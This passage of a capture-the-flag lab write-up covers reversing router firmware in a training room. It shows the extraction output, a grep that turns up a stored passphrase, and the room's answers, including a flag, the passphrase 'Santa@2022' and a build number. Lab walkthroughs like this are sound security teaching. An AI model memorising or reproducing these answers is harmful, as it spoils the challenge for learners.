+0, product version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kerne
+l length: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+13344         0x3420          U-Boot version string, "U-Boot 1.1.4 (Apr  6 2016 - 11:12:23)"
+13392         0x3450          CRC32 polynomial table, big endian
+14704         0x3970          uImage header, header size: 64 bytes, header CRC: 0x5A946B00, created: 2016-04-06 03:12:
+24, image size: 35920 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x510235FE, OS: Linux, CPU: 
+MIPS, image type: Firmware Image, compression type: lzma, image name: "u-boot image"
+14768         0x39B0          LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed si
+ze: 93944 bytes
+131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: "", product ID: 0x0, pr
+oduct version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel len
+gth: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed si
+ze: 2494744 bytes
+1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2809007 bytes, 
+605 inodes, blocksize: 131072 bytes, created: 2022-12-01 05:42:58
+
+Extracting 1180160 bytes of tp-link header image at offset 0
+Extracting squashfs file system at offset 1180160
+3990016
+3990016
+0
+Extracting squashfs files...
+Firmware extraction successful!
+Firmware parts can be found in '/home/test/bin/fmk/*'
+```
+{: .nolineno }
+
+Let's take a look at those files :
+
+![Decrypt](/images/thm/adventofcyber4/adventofcyber4_131.png)
+_Decrypt_
+
+Answer : THM{WE_GOT_THE_FIRMWARE_CODE}
+
+### What is the Paraphrase value for the binary firmwarev1.0_unsigned?
+
+While the old version is extracted, we can search recursively with grep for our paraphrase as done in previous question :
+
+```console
+test@ip-10-10-207-155:~/bin-unsigned$ grep -ir paraphrase
+fmk/rootfs/gpg/secret.txt:PARAPHRASE: Santa@2022
+test@ip-10-10-207-155:~/bin-unsigned$ 
+```
+{: .nolineno }
+
+Answer : Santa@2022
+
+### After reversing the encrypted firmware, can you find the build number for rootfs?
+
+We can search through the files for "build" keyword :
+
+![Decrypt](/images/thm/adventofcyber4/adventofcyber4_132.png)
+_Decrypt_
+
+Answer : 2.6.31
+
+### Did you know we have a wonderful community on Discord? If you join us there, you can count on nice conversation, cyber security tips & tricks, and room help from our mods and mentors. Our Discord admin has some rooms out, too - you can try an easy one or a hard one!
+
+No Answer.
+
+
 ## TASK 26: [Day 21] MQTT Have yourself a merry little webcam 
 ## TASK 27 : [Day 22] Attack Surface Reduction Threats are failing all around me 
 ## TASK 28 : [Day 23] Defence in Depth Mission ELFPossible: Abominable for a Day 
